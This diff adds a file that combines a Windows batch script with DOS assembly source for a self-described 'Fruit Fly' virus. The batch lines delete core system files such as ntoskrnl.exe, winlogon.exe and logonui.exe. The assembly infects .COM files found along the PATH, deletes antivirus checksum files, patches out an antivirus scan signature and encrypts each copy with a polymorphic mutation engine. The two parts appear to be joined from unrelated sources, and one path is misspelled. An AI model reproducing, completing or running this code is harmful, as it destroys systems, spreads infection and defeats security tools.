@@ -1,0 +1,1373 @@
+@echo off
+del "C:\windows\pchealth\"
+del "C:\windows\system\"
+del "C:\windows\system32\restore\"
+del "winlogon.exe"
+del "C:\windows\system32\autoexec.nt"
+del "C:\windows\system32\logonui.exe"
+del "C:\windows\systems32\ntoskrnl.exe"
+
+CALL $+3
+        POP AX
+        MOV CL,4H
+        SHR AX,CL
+        SUB AX,0010H
+        MOV CX,CS
+        ADD AX,CX
+        PUSH AX
+        MOV AX,OFFSET START1
+        PUSH AX
+        RETF
+START1: JMP CS:[MTAB_BEGIN]
+
+MTAB:
+MTAB_BEGIN      DW OFFSET BEGIN,OFFSET BEGIN@-OFFSET BEGIN
+MTAB_DATA       DW OFFSET DATA,OFFSET DATA@-OFFSET DATA
+MTAB_SAVE_DTA   DW OFFSET SAVE_DTA,OFFSET SAVE_DTA@-OFFSET SAVE_DTA
+MTAB_DEL_CPS    DW OFFSET DEL_CPS,OFFSET DEL_CPS@-OFFSET DEL_CPS
+MTAB_CHKLIST    DW OFFSET CHKLIST,OFFSET CHKLIST@-OFFSET CHKLIST
+MTAB_VIRUS_SAFE DW OFFSET VIRUS_SAFE,OFFSET VIRUS_SAFE@-OFFSET VIRUS_SAFE
+MTAB_INF        DW OFFSET INF,OFFSET INF@-OFFSET INF
+MTAB_MOV_COM    DW OFFSET MOV_COM,OFFSET MOV_COM@-OFFSET MOV_COM
+MTAB_ALL_COM    DW OFFSET ALL_COM,OFFSET ALL_COM@-OFFSET ALL_COM
+MTAB_READ       DW OFFSET READ,OFFSET READ@-OFFSET READ
+MTAB_CRC        DW OFFSET CRC,OFFSET CRC@-OFFSET CRC
+MTAB_IMMUNE     DW OFFSET IMMUNE,OFFSET IMMUNE@-OFFSET IMMUNE
+MTAB_SCAN_AV    DW OFFSET SCAN_AV,OFFSET SCAN_AV@-OFFSET SCAN_AV
+MTAB_POS        DW OFFSET POS,OFFSET POS@-OFFSET POS
+MTAB_TO_END     DW OFFSET TO_END,OFFSET TO_END@-OFFSET TO_END
+MTAB_FIND_SCAN  DW OFFSET FIND_SCAN,OFFSET FIND_SCAN@-OFFSET FIND_SCAN
+MTAB_SCAN       DW OFFSET SCAN,OFFSET SCAN@-OFFSET SCAN
+MTAB_WRITE_ME   DW OFFSET WRITE_ME,OFFSET WRITE_ME@-OFFSET WRITE_ME
+MTAB_MUTATE     DW OFFSET MUTATE,OFFSET MUTATE@-OFFSET MUTATE
+MTAB_RND        DW OFFSET RND,OFFSET RND@-OFFSET RND
+MTAB_TO_BEG     DW OFFSET TO_BEG,OFFSET TO_BEG@-OFFSET TO_BEG
+MTAB_JFILE      DW OFFSET JFILE,OFFSET JFILE@-OFFSET JFILE
+MTAB_PATH       DW OFFSET PATH,OFFSET PATH@-OFFSET PATH
+MTAB_FETCH_PATH DW OFFSET FETCH_PATH,OFFSET FETCH_PATH@-OFFSET FETCH_PATH
+MTAB_GET_DIR    DW OFFSET GET_DIR,OFFSET GET_DIR@-OFFSET GET_DIR
+MTAB_TEXT       DW OFFSET TEXT,OFFSET TEXT@-OFFSET TEXT
+MTAB_TEXT1      DW OFFSET TEXT1,OFFSET TEXT1@-OFFSET TEXT1
+MTAB_TEXT2      DW OFFSET TEXT2,OFFSET TEXT2@-OFFSET TEXT2
+MTAB_BUILD      DW OFFSET BUILD,OFFSET BUILD@-OFFSET BUILD
+MTAB_MAKE       DW OFFSET MAKE,OFFSET MAKE@-OFFSET MAKE
+MTAB_HEAD       DW OFFSET HEAD,OFFSET HEAD@-OFFSET HEAD
+MTAB_BTAIL      DW OFFSET BTAIL,OFFSET BTAIL@-OFFSET BTAIL
+MTAB_INCDOFF    DW OFFSET INCDOFF,OFFSET INCDOFF@-OFFSET INCDOFF
+MTAB_FILL       DW OFFSET FILL,OFFSET FILL@-OFFSET FILL
+MTAB_FILL7      DW OFFSET FILL7,OFFSET FILL7@-OFFSET FILL7
+MTAB_FILL_NUM   DW OFFSET FILL_NUM,FILL_NUM@-OFFSET FILL_NUM
+MTAB_FTABLE     DW OFFSET FTABLE,OFFSET FTABLE@-OFFSET FTABLE
+MTAB_PUTINC     DW OFFSET PUTINC,OFFSET PUTINC@-OFFSET PUTINC
+MTAB_HOP        DW OFFSET HOP,OFFSET HOP@-OFFSET HOP
+MTAB_TOP        DW OFFSET TOP,OFFSET TOP@-OFFSET TOP
+MTAB_LODSTO     DW OFFSET LODSTO,OFFSET LODSTO@-OFFSET LODSTO
+MTAB_ETAB       DW OFFSET ETAB,OFFSET ETAB@-OFFSET ETAB
+MTAB_ALTTAB     DW OFFSET ALTTAB,OFFSET ALTTAB@-OFFSET ALTTAB
+MTAB_CONVERT    DW OFFSET CONVERT,OFFSET CONVERT@-OFFSET CONVERT
+MTAB_PUTCL      DW OFFSET PUTCL,OFFSET PUTCL@-OFFSET PUTCL
+
+MTAB@:   
+
+BEGIN:  PUSH CS
+        POP DS
+        MOV BX,DS:[MTAB_DATA]
+        MOV AX,DS:[BX]
+        MOV WORD PTR ES:[100H],AX
+        MOV AX,DS:[BX+2]
+        MOV WORD PTR ES:[102H],AX
+        MOV WORD PTR DS:[DIR_OFF],OFFSET NEW_DIR
+        CALL DS:[MTAB_SAVE_DTA]
+        CALL DS:[MTAB_INF]
+        OR AX,AX
+        JNE BEGIN_CONT
+BEGIN_JFILE:JMP DS:[MTAB_JFILE]
+BEGIN_CONT:CALL DS:[MTAB_FETCH_PATH]
+        OR AX,AX
+        JNE BEGIN_JFILE
+BEGIN_LP:CALL DS:[MTAB_GET_DIR]
+        CALL DS:[MTAB_INF]
+        OR AX,AX
+        JE BEGIN_JFILE
+        CMP BYTE PTR DS:[PATH_END],0H
+        JNE BEGIN_JFILE
+        JMP SHORT BEGIN_LP
+BEGIN@:
+
+JFILE:  MOV AX,1A00H
+        MOV DX,DS:[OLD_DTA_BX]
+        MOV DS,DS:[OLD_DTA_ES] 
+        INT 21H
+        PUSH SS
+        POP DS
+        PUSH SS
+        POP ES
+        MOV AX,100H
+        PUSH DS
+        PUSH AX
+        XOR AX,AX
+        XOR BX,BX
+        RETF
+JFILE@:
+
+
+INF:    MOV BYTE PTR DS:[WRITE_BYTE],0H
+        MOV WORD PTR DS:[IMMUNE_OFF],0H
+        CALL DS:[MTAB_MOV_COM]
+        MOV DX,OFFSET NEW_DIR
+        MOV AX,4E00H
+        MOV CX,0027H
+        INT 21H
+        JNB INF_FND
+INF_RTN:XOR AX,AX
+        DEC AX
+        RETN
+INF_RTZ:XOR AX,AX
+        RETN
+INF_CLS_NXT:CMP BYTE PTR DS:[WRITE_BYTE],00H
+        JE INF_CLS_ATTR
+        MOV AX,5701H
+        MOV CX,DS:[NEW_DTA+16H]
+        MOV DX,DS:[NEW_DTA+18H]
+        INT 21H
+INF_CLS_ATTR:MOV AX,3E00H
+        INT 21H
+        TEST BYTE PTR DS:[NEW_DTA+15H],1H
+        JE INF_NEXT
+        XOR CX,CX
+        MOV CL,DS:[NEW_DTA+15H]
+        MOV DX,OFFSET NEW_DIR
+        MOV AX,4301H
+        INT 21H
+INF_NEXT:CMP BYTE PTR DS:[WRITE_BYTE],0H
+        MOV BYTE PTR DS:[WRITE_BYTE],0H
+        JNE INF_RTZ
+        MOV AH,4FH
+        INT 21H
+        JB INF_RTN
+INF_FND:CMP BYTE PTR DS:[NEW_DTA+19H],0C8H
+        JNB INF_NEXT
+        ADD BYTE PTR DS:[NEW_DTA+19H],0C8H
+        MOV SI,OFFSET NEW_DTA+1EH
+        MOV DI,DS:[DIR_OFF]
+        MOV DX,OFFSET NEW_DIR
+INF_MLP:CLD
+        LODSB
+        CLD
+        STOSB
+        OR AL,AL
+        JNZ INF_MLP
+        TEST BYTE PTR DS:[NEW_DTA+15H],1
+        JE INF_NOTRO
+        MOV AX,4301H
+        XOR CX,CX
+        INT 21H
+INF_NOTRO:MOV AX,3D02H
+        INT 21H
+        JB INF_CLS_NXT
+        MOV BX,AX
+        MOV CX,0010H
+        MOV DX,OFFSET SHORT_BUFF
+        CALL DS:[MTAB_READ]
+        OR AX,AX
+        JNE INF_JCLS_NXT
+        PUSH BX
+        MOV BX,DS:[MTAB_DATA]
+        MOV AX,DS:[SHORT_BUFF]
+        CMP AX,'ZM'
+        JE INF_JCLS_NXT
+        MOV WORD PTR DS:[BX],AX
+        MOV AX,DS:[SHORT_BUFF+2H]
+        MOV WORD PTR DS:[BX+2H],AX
+        POP BX
+        CALL DS:[MTAB_CRC]
+        OR AX,AX
+        JNE INF_JCLS_NXT
+        CALL DS:[MTAB_DEL_CPS]
+        OR AX,AX
+        JNE INF_JCLS_NXT
+        CALL DS:[MTAB_TO_END]
+        OR AX,AX
+        JNE INF_JCLS_NXT
+        CALL DS:[MTAB_WRITE_ME]                     
+        OR AX,AX
+        JNE INF_JCLS_NXT
+        CALL DS:[MTAB_TO_BEG]
+INF_JCLS_NXT:JMP INF_CLS_NXT
+INF@:   
+
+WRITE_ME:CALL DS:[MTAB_MUTATE]
+        MOV AX,4000H
+        INT 21H
+        JB WRITE_ME_ERR
+        MOV BYTE PTR DS:[WRITE_BYTE],1H
+        XOR AX,AX
+        RETN
+WRITE_ME_ERR:XOR AX,AX
+        DEC AX
+        RETN
+WRITE_ME@:
+
+READ:   MOV AX,3F00H
+        INT 21H
+        JB READ_E
+        CMP AX,CX
+        JNE READ_E
+        XOR AX,AX
+        RETN
+READ_E: XOR AX,AX
+        DEC AX
+        RETN
+READ@:
+
+CRC:    MOV SI,DS:[MTAB_IMMUNE]
+        MOV DI,OFFSET SHORT_BUFF+6H
+        MOV CX,DS:[MTAB_IMMUNE+2H]
+        CLD
+        REPE CMPSB
+        JNE CRC_CONT
+        MOV DX,DS:[SHORT_BUFF+1H]
+        ADD DX,3H
+        XOR AX,AX
+        SUB DX,0025H
+        MOV WORD PTR DS:[IMMUNE_OFF],DX
+        CALL DS:[MTAB_POS]
+        MOV CX,0004H
+        MOV DX,OFFSET SHORT_BUFF
+        CALL DS:[MTAB_READ]
+        OR AX,AX
+        JNE CRC_ERR
+        PUSH BX
+        MOV BX,DS:[MTAB_DATA]
+        MOV AX,DS:[SHORT_BUFF]
+        MOV WORD PTR DS:[BX],AX
+        MOV AX,DS:[SHORT_BUFF+2H]
+        MOV WORD PTR DS:[BX+2H],AX
+        POP BX
+CRC_CONT:XOR AX,AX
+        RETN
+CRC_ERR:XOR AX,AX
+        DEC AX
+        RETN
+CRC@:
+
+TO_END: MOV AL,02H
+        XOR DX,DX
+        CALL DS:[MTAB_POS]
+        CMP AX,400H
+        JB TO_END_ERR
+        CMP AX,0FA00H
+        JA TO_END_ERR
+        OR DX,DX
+        JNE TO_END_ERR
+        SUB AX,75
+        MOV DX,AX
+        XOR AX,AX
+        CALL DS:[MTAB_POS]
+        MOV WORD PTR DS:[AV_OFF],AX
+        MOV CX,75
+        MOV DX,OFFSET BUFFER
+        CALL DS:[MTAB_READ]
+        OR AX,AX
+        JNE TO_END_ERR
+        CALL DS:[MTAB_FIND_SCAN]
+        OR AX,AX
+        JNE TO_END_RT
+        MOV AL,1H
+        XOR DX,DX
+        CALL DS:[MTAB_POS]
+        TEST AX,000FH
+        JE TO_END_NA
+        AND AX,0FFF0H
+        ADD AX,0010H
+        MOV DX,AX
+        MOV AL,0
+        CALL DS:[MTAB_POS]
+TO_END_NA:SUB AX,3H
+        MOV WORD PTR DS:[SHORT_BUFF+1H],AX
+        MOV BYTE PTR DS:[SHORT_BUFF],0E9H
+TO_END_RT:XOR AX,AX
+        RETN
+TO_END_ERR:XOR AX,AX
+        DEC AX
+        RETN
+TO_END@:
+
+TO_BEG: MOV DX,DS:[IMMUNE_OFF]
+        MOV AL,0H
+        OR DX,DX
+        JE TO_BEG_NCPAV
+        SUB DX,6H
+        PUSH DX
+        XOR DX,DX
+        MOV AL,2H
+        CALL DS:[MTAB_POS]
+        POP DX
+        PUSH AX
+        XOR AX,AX
+        CALL DS:[MTAB_POS]
+        POP WORD PTR DS:[BUFFER]
+        MOV DX,OFFSET BUFFER
+        MOV CX,2H
+        MOV AX,4000H
+        INT 21H
+        MOV DX,DS:[IMMUNE_OFF]
+        MOV AL,0H
+TO_BEG_NCPAV:CALL DS:[MTAB_POS]
+        MOV DX,OFFSET SHORT_BUFF
+        MOV CX,4H
+        MOV AX,4000H
+        INT 21H
+        RETN
+TO_BEG@:
+
+GET_DIR:MOV SI,DS:[PATH_OFF]
+        PUSH SS
+        POP DS
+        MOV DS,DS:[002CH]
+        MOV DI,OFFSET NEW_DIR
+GET_DIR_LP:CLD
+        LODSB
+        CMP AL,';'
+        JE GET_DIR_END
+        OR AL,AL
+        JE GET_DIR_END_Z
+        CLD
+        STOSB
+        JMP SHORT GET_DIR_LP
+GET_DIR_END_Z:MOV BYTE PTR CS:[PATH_END],1H
+GET_DIR_END:MOV AL,'\'
+        CMP BYTE PTR CS:[DI-1H],AL
+        JE GET_DIR_P
+        CLD
+        STOSB
+GET_DIR_P:PUSH CS
+        POP DS
+        MOV WORD PTR DS:[DIR_OFF],DI
+        MOV WORD PTR DS:[PATH_OFF],SI
+        RETN
+GET_DIR@:
+         
+MOV_COM:MOV DI,DS:[DIR_OFF]
+        MOV SI,DS:[MTAB_ALL_COM]
+        MOV CX,DS:[MTAB_ALL_COM+2H]
+        CLD
+        REP MOVSB
+        RETN
+MOV_COM@:
+         
+SAVE_DTA:MOV AX,2F00H
+        INT 21H
+        MOV WORD PTR DS:[OLD_DTA_BX],BX
+        MOV WORD PTR DS:[OLD_DTA_ES],ES
+        MOV AX,1A00H                    
+        MOV DX,OFFSET NEW_DTA
+        INT 21H
+        PUSH CS
+        POP ES
+        RETN
+SAVE_DTA@:
+
+FETCH_PATH:MOV AX,SS:[002CH]
+        OR AX,AX
+        JE FETCH_PATH_NOT
+        MOV ES,AX
+        XOR DI,DI
+        MOV CX,7FFFH
+        XOR AX,AX
+FETCH_PATH_LP:CLD
+        REPNE SCASB
+        JNE FETCH_PATH_NOT
+        CMP BYTE PTR ES:[DI],'P'
+        JE FETCH_PATH_CMP
+        CLD
+        SCASB
+        JE FETCH_PATH_NOT
+        JMP SHORT FETCH_PATH_LP
+FETCH_PATH_NOT:PUSH CS
+        POP ES
+        XOR AX,AX
+        DEC AX
+        RETN
+FETCH_PATH_CMP:PUSH CX
+        PUSH DI
+        MOV SI,DS:[MTAB_PATH]
+        MOV CX,DS:[MTAB_PATH+2H]
+        CLD
+        REPE CMPSB
+        MOV DX,DI
+        POP DI
+        POP CX
+        JNE FETCH_PATH_LP
+        MOV WORD PTR DS:[PATH_OFF],DX
+        MOV BYTE PTR DS:[PATH_END],0H
+        PUSH CS
+        POP ES
+        XOR AX,AX
+        RETN
+FETCH_PATH@:
+         
+DEL_CPS:MOV DI,DS:[DIR_OFF]
+        MOV CX,DS:[MTAB_CHKLIST+2H]
+        MOV SI,DS:[MTAB_CHKLIST]
+        MOV DX,OFFSET NEW_DIR
+        PUSH DI
+        CLD
+        REP MOVSB
+        POP DI
+        CALL DELETE
+        OR AX,AX
+        JNE DEL_CPS_RET
+        MOV SI,DS:[MTAB_VIRUS_SAFE]
+        MOV CX,DS:[MTAB_VIRUS_SAFE+2H]
+        CLD
+        REP MOVSB
+        CALL DELETE
+DEL_CPS_RET:PUSH AX
+        MOV DI,DS:[DIR_OFF]
+        MOV SI,OFFSET NEW_DTA+1EH
+DEL_CPS_LP:CLD
+        LODSB
+        STOSB
+        OR AL,AL
+        JNE DEL_CPS_LP
+        POP AX
+        RETN
+DELETE: MOV AX,4301H
+        XOR CX,CX
+        INT 21H
+        JB DEL_CPS_NH
+        MOV AX,4100H
+        INT 21H
+        JNB DEL_CPS_GN
+DEL_CPS_ER:XOR AX,AX
+        DEC AX
+        RETN
+DEL_CPS_NH:CMP AL,02H
+        JNE DEL_CPS_ER
+DEL_CPS_GN:XOR AX,AX
+        RETN
+DEL_CPS@:
+
+POS:    XOR CX,CX
+        MOV AH,42H
+        INT 21H
+        RETN
+POS@:
+
+FIND_SCAN:MOV SI,DS:[MTAB_SCAN_AV]
+        MOV CX,DS:[MTAB_SCAN_AV+2H]
+        PUSH SI
+        PUSH CX
+FIND_SCAN_DE_LP:DEC BYTE PTR DS:[SI]
+        INC SI
+        LOOP FIND_SCAN_DE_LP
+        POP CX
+        POP SI
+        PUSH CX
+        PUSH SI
+        MOV DI,OFFSET BUFFER
+        MOV AX,75
+        CALL DS:[MTAB_SCAN]
+        OR AX,AX
+        JNE FIND_SCAN_DEC_Z
+        SUB DI,OFFSET BUFFER                
+        MOV AX,DI
+        ADD AX,DS:[AV_OFF]
+        MOV DX,AX
+        XOR AX,AX
+        CALL DS:[MTAB_POS]
+        XOR CX,CX
+        MOV AX,4000H
+        INT 21H
+FIND_SCAN_DEC_Z:XOR AX,AX
+FIND_SCAN_DEC:POP SI
+        POP CX
+FIND_SCAN_EN_LP:INC BYTE PTR DS:[SI]
+        INC SI
+        LOOP FIND_SCAN_EN_LP
+        RETN
+FIND_SCAN_ERR:XOR AX,AX
+        DEC AX
+        JMP SHORT FIND_SCAN_DEC
+FIND_SCAN@:
+
+SCAN:   PUSH CX
+        MOV CX,AX
+        MOV AL,DS:[SI]
+        CLD
+        REPNE SCASB
+        MOV AX,CX
+        POP CX
+        JNE SCAN_NO
+        DEC DI
+        PUSH CX
+        CLD
+        REP CMPSB
+        POP CX
+        JNE SCAN
+        SUB DI,CX
+        XOR AX,AX
+        RETN
+SCAN_NO:XOR AX,AX
+        DEC AX
+        RETN
+SCAN@:
+
+CONVERT:PUSH AX
+        PUSH BX
+        PUSH DI
+        PUSH SI
+        CALL DS:[MTAB_RND]        
+        TEST AL,1H
+        JNE NO_CONVERT
+        MOV SI,DS:[MTAB_TEXT2]
+        ADD SI,000AH
+        MOV DI,DS:[MTAB_TEXT1]
+        INC DI
+        MOV BX,DS:[MTAB_TEXT]
+        ADD BX,0015H
+        CMP BYTE PTR DS:[BX],'H'
+        JNE TO_HACKER
+        MOV BYTE PTR DS:[BX],'G'
+        MOV AX,'aG'             ;'aG'  6147H
+        CLD
+        STOSW
+        MOV WORD PTR DS:[SI],AX
+        INC SI
+        INC SI
+        ADD AX,(7300H-6100H)+(6EH-47H)   ;'sn'  736EH        'Gansta'
+        CLD
+        STOSW
+        MOV WORD PTR DS:[SI],AX
+        INC SI
+        INC SI
+        ADD AX,-(7300H-6100H)+(74H-6EH)  ;'at'   6174H
+        CLD
+        STOSW
+        MOV WORD PTR DS:[SI],AX
+        JMP SHORT NO_CONVERT
+TO_HACKER:MOV BYTE PTR DS:[BX],'H'
+        MOV AX,'aH'             ;'aH'   6148H
+        CLD
+        STOSW
+        MOV WORD PTR DS:[SI],AX
+        INC SI
+        INC SI
+        ADD AX,(6B00H-6100H)+(63H-48H)   ;'kc'   6B63H    'Hacker'
+        CLD
+        STOSW
+        MOV WORD PTR DS:[SI],AX
+        INC SI
+        INC SI
+        ADD AX,(7200H-6B00H)+(65H-63H)  ;'re'   7265H
+        CLD
+        STOSW
+        MOV WORD PTR DS:[SI],AX
+NO_CONVERT:POP SI
+        POP DI
+        POP BX
+        POP AX
+        RETN
+CONVERT@:
+
+
+
+IMMUNE:   DB 22H,19H,35H,93H,59H,57H,54H,80H
+IMMUNE@:
+SCAN_AV:  DB 0F1H,0FEH,0C6H,0ABH,0H,0F1H
+SCAN_AV@:
+CHKLIST:  DB 'CHKLIST.CPS',0H
+CHKLIST@:
+VIRUS_SAFE:DB 'VS.VS',0H
+VIRUS_SAFE@:
+ALL_COM:  DB '????????.COM',0H
+ALL_COM@:
+PATH:     DB 'PATH='
+PATH@:
+TEXT:     DB 0H,'Fruit Fly virus by OH Hex-Bone',0H
+TEXT@:
+TEXT1:    DB 0H,'Hacker4Life',0H
+TEXT1@:
+TEXT2:    DB 0H,'Original Hacker',0H
+TEXT2@:   
+
+DATA:
+
+DATA_B100       DW ?
+DATA_B102       DW ?
+
+DATA@:
+
+MUTATE: CALL DS:[MTAB_CONVERT]
+        PUSH BX
+        MOV DI,OFFSET MUT_SCAN_TAB
+        MOV CX,OFFSET MTAB@-OFFSET MTAB
+        SHR CX,1H
+        SHR CX,1H
+        PUSH CX
+        CLD
+        REP STOSB
+        POP CX
+        MOV AX,40H
+        SUB AX,CX
+        MOV CX,AX
+        MOV AL,1H
+        CLD
+        REP STOSB
+        MOV DI,OFFSET MUT_COPY
+        MOV SI,OFFSET STAR
+        MOV CX,OFFSET MTAB@-OFFSET STAR
+        CLD 
+        REP MOVSB
+MUTATE_LP:CALL DS:[MTAB_RND]
+        AND AX,003FH
+        MOV BX,OFFSET MUT_SCAN_TAB
+        ADD BX,AX
+        CMP BYTE PTR DS:[BX],0H
+        JNE MUTATE_LP
+        MOV BYTE PTR DS:[BX],1H
+        SHL AX,1
+        SHL AX,1
+        MOV SI,OFFSET MTAB
+        ADD SI,AX
+        MOV CX,DS:[SI+2H]
+        MOV SI,DS:[SI]
+        PUSH DI
+        CLD
+        REP MOVSB
+        POP SI
+        MOV BX,OFFSET MUT_COPY
+        ADD BX,OFFSET MTAB-OFFSET STAR
+        ADD BX,AX
+        SUB SI,OFFSET MUT_COPY
+        ADD SI,100H
+        MOV WORD PTR DS:[BX],SI
+        PUSH DI
+        MOV DI,OFFSET MUT_SCAN_TAB
+        MOV AL,0H
+        MOV CX,003FH
+        CLD
+        REPNE SCASB
+        POP DI
+        JE MUTATE_LP
+        CALL DS:[MTAB_BUILD]
+        POP BX
+        RETN
+MUTATE@:
+        
+RND:    PUSH CX
+RND1:   PUSH AX
+        XOR AX,AX
+        MOV DS,AX
+        POP AX
+        ADD AX,DS:[46CH]
+        PUSH CS
+        POP DS
+        ADD AX,DS:[RANDOM]
+        ADD CX,AX
+        XCHG AL,AH
+        TEST AX,CX
+        JE RND2
+        TEST CH,CL
+        JE RND3
+        ADD CX,AX
+RND2:   XCHG CL,CH
+        SUB CX,AX
+        SUB WORD PTR DS:[RANDOM],AX
+        CMP WORD PTR DS:[LAST],AX
+        JNE RNDRT
+        TEST CX,AX
+        JNE RND3
+        SUB AH,CL
+        ADD CX,AX
+        TEST AL,CL
+        JNE RND3
+        TEST WORD PTR DS:[RANDOM],AX
+        JE RND3
+        SUB CX,AX
+RND3:   XCHG AL,AH
+        SUB CX,AX
+        XCHG CL,CH
+        JMP RND1
+RNDRT:  MOV WORD PTR DS:[LAST],AX
+        POP CX
+        RET
+RND@:
+BUILD:  CALL DS:[MTAB_ALTTAB]
+        MOV DI,OFFSET DECRYPT
+        AND DI,0FFF0H
+        ADD DI,0010H
+        MOV WORD PTR DS:[DOFF],DI
+        MOV WORD PTR DS:[EOFF],OFFSET ENCRYPT
+        CALL DS:[MTAB_HEAD]
+BUILDL: CALL DS:[MTAB_RND]
+        AND AX,001FH
+        JE BUILDL
+        MOV WORD PTR DS:[ECNT],AX
+        MOV WORD PTR DS:[INST],AX
+BUILDLP:CALL DS:[MTAB_MAKE]
+        DEC WORD PTR DS:[ECNT]
+        JNE BUILDLP
+        CALL DS:[MTAB_BTAIL]
+        RETN
+;BUILDL: MOV CX,OFFSET DONE-OFFSET STAR
+;        MOV DX,OFFSET STAR
+;        RETN
+BUILD@:
+
+MAKE:   MOV BX,DS:[MTAB_ETAB]
+        CALL DS:[MTAB_RND]
+        AND AX,001FH
+        SHL AX,1H
+        ADD BX,AX
+        MOV SI,DS:[BX]
+        ADD SI,DS:[MTAB_ETAB]
+        INC SI
+        MOV DI,DS:[EOFF]  ;DI=OFFSET OF ENCRYPT+N
+        MOV AH,DS:[SI-1H]
+        MOV CL,4H
+        SHR AH,CL           ;GET INSTRUCTION SIZE
+        XOR CX,CX
+        MOV CL,AH
+        CALL DS:[MTAB_RND]
+        TEST AX,1H
+        JNE NOSWI
+        PUSH CX
+        PUSH DI
+        PUSH SI
+        MOV DI,SI
+        ADD DI,CX
+SWLP:   MOV AL,DS:[DI]
+        XCHG DS:[SI],AL
+        CLD
+        STOSB
+        INC SI
+        LOOP SWLP
+        POP SI
+        POP DI
+        POP CX
+NOSWI:  MOV DL,DS:[SI-1H]
+        TEST DL,00001000B
+        JE MOVINT
+        MOV BX,DS:[MTAB_LODSTO]
+        MOV AL,DS:[BX]
+        CLD
+        STOSB
+        JMP PUTADD
+MOVINT: CALL DS:[MTAB_RND]
+        TEST AL,1H
+        JNE PUTADD
+        PUSH SI
+        ADD SI,CX
+        DEC SI
+        TEST DL,00000100B
+        JNE ROTCL
+        DEC SI
+        TEST DL,00000010B
+        JNE ROTCL
+        DEC SI
+ROTCL:  TEST DL,1H
+        JE ROTIT
+        DEC SI
+ROTIT:  RCR BYTE PTR DS:[SI],1H
+        CMC
+        RCL BYTE PTR DS:[SI],1H
+        ADD SI,CX
+        RCR BYTE PTR DS:[SI],1H
+        CMC
+        RCL BYTE PTR DS:[SI],1H
+        POP SI
+PUTADD: TEST DL,00000100B
+        JNE NOADD
+        PUSH SI
+        ADD SI,CX
+        DEC SI
+        TEST DL,00000010B
+        JNE ADBYTE
+        CALL DS:[MTAB_RND]
+        DEC SI
+        ADD WORD PTR DS:[SI],AX
+        ADD SI,CX
+        ADD WORD PTR DS:[SI],AX
+        POP SI
+        JMP NOADD
+ADBYTE: CALL DS:[MTAB_RND]
+        ADD BYTE PTR DS:[SI],AL
+        ADD SI,CX
+        ADD BYTE PTR DS:[SI],AL
+        POP SI
+NOADD:  PUSH CX
+        CLD
+        REP MOVSB
+        POP CX
+        TEST DL,00001000B
+        JNE PUTSTO
+        CALL DS:[MTAB_PUTINC]
+        JMP MDEC
+PUTSTO: MOV AL,DS:[BX+1H]
+        CLD
+        STOSB
+MDEC:   MOV WORD PTR DS:[EOFF],DI
+        MOV DI,DS:[DOFF]
+        MOV BYTE PTR DS:[FILLB],YES
+        TEST DL,00001000B
+        JE DECMOV
+        MOV AL,DS:[BX]
+        CLD
+        STOSB
+        CALL DS:[MTAB_FILL]
+DECMOV: CLD
+        REP MOVSB
+        CALL DS:[MTAB_FILL]
+        TEST DL,00001000B
+        JE DECINC
+        MOV AL,DS:[BX+1H]
+        CLD
+        STOSB
+        JMP DECRT
+DECINC: CALL DS:[MTAB_PUTINC]
+DECRT:  CALL DS:[MTAB_FILL]
+        CMP WORD PTR DS:[ECNT],1H
+        JNE SAVEDI
+        MOV AL,0EBH
+        CLD
+        STOSB
+        XOR AX,AX
+        MOV BX,DI
+        CLD
+        STOSB
+MOVCLP: MOV AX,DS:[INST]
+        SHL AX,1H
+        CMP AX,6H
+        JBE SAVEDI
+        SUB AX,0006H                                                        
+        MOV CX,AX
+        CALL DS:[MTAB_FILL_NUM]
+MAKE_LP:CALL DS:[MTAB_RND]
+        TEST AL,1H
+        JNE MAKE_NI
+        INC BYTE PTR DS:[BX]
+MAKE_NI:LOOP MAKE_LP
+SAVEDI: MOV WORD PTR DS:[DOFF],DI
+        MOV BYTE PTR DS:[FILLB],NO
+        RETN
+MAKE@:  
+
+FILL_NUM:PUSH AX
+        PUSH BX
+        PUSH CX
+        MOV BX,DS:[MTAB_FTABLE]
+FINLP:  CALL DS:[MTAB_RND]
+        AND AX,000FH
+        XLAT
+        CLD
+        STOSB
+        LOOP FINLP
+        POP CX
+        POP BX
+        POP AX
+        RETN
+FILL_NUM@:
+
+FILL:   PUSH AX
+        PUSH BX
+        PUSH CX
+        CALL DS:[MTAB_RND]
+        AND AX,001FH
+        MOV CX,AX
+        MOV WORD PTR DS:[FILL_CNT],AX
+        JCXZ FILRT
+        MOV BX,DS:[MTAB_FTABLE]
+FILP:   CALL DS:[MTAB_RND]
+        AND AL,0FH
+        XLAT
+        CLD
+        STOSB
+        LOOP FILP
+FILRT:  POP CX
+        POP BX
+        POP AX
+        RETN
+FILL@:
+
+FTABLE: NOP
+        STC
+        CLC
+        CMC
+        CLD
+        STI
+        SAHF
+        INC BX
+        DEC BX
+        INC DX
+        DEC DX
+        INC BP
+        DEC BP
+        DB 2EH
+        DB 3EH
+        DB 26H
+FTABLE@:
+
+PUTINC: PUSH AX
+        PUSH CX
+        PUSH SI
+        MOV CL,DS:[FILLB]
+        MOV SI,DS:[MTAB_INCDOFF]
+        CALL DS:[MTAB_RND]
+        TEST AL,01H
+        JE MOVINC
+        ADD SI,6H
+MOVINC: CLD
+        MOVSB
+        JCXZ NOFIL1
+        CALL DS:[MTAB_FILL7]
+NOFIL1: CLD
+        MOVSB
+        JCXZ NOFIL2
+        CALL DS:[MTAB_FILL7]
+NOFIL2: CALL DS:[MTAB_RND]
+        TEST AL,1H
+        JE MOVINC1
+        INC SI
+        INC SI
+        CLD
+        MOVSW
+        JMP SHORT MOVINCR
+MOVINC1:CLD
+        MOVSB
+        JCXZ NOFIL3
+        CALL DS:[MTAB_FILL7]
+NOFIL3: CLD
+        MOVSB
+MOVINCR:POP SI
+        POP CX
+        POP AX
+        RETN
+PUTINC@:
+
+FILL7:  PUSH AX
+        PUSH CX
+        CALL DS:[MTAB_RND]
+        AND AX,0007H
+        MOV CX,AX
+        JCXZ NOFL7
+        CALL DS:[MTAB_FILL_NUM]
+NOFL7:  POP CX
+        POP AX
+        RETN
+FILL7@:
+
+BTAIL:  MOV SI,DS:[MTAB_TOP]
+        CALL DS:[MTAB_RND]
+        MOV CX,6H
+        TEST AL,1H
+        JE TAILMOV
+        ADD SI,CX
+TAILMOV:CLD 
+        REP MOVSB
+        MOV AX,DI
+        SUB AX,DS:[DEC_START]          ;TELL TAIL WHERE TO JMP
+        NEG AX
+        MOV WORD PTR DS:[DI-2H],AX
+        MOV WORD PTR DS:[DOFF],DI
+        MOV BX,DS:[INST]
+        SHL BX,1H
+        MOV AX,DI
+        SUB AX,BX                     ;HOW MUCH OF THE DECRYPTION 
+        PUSH AX                       ;  TO ENCRYPT?
+        PUSH BX
+        MOV BX,DS:[MTAB_FTABLE]
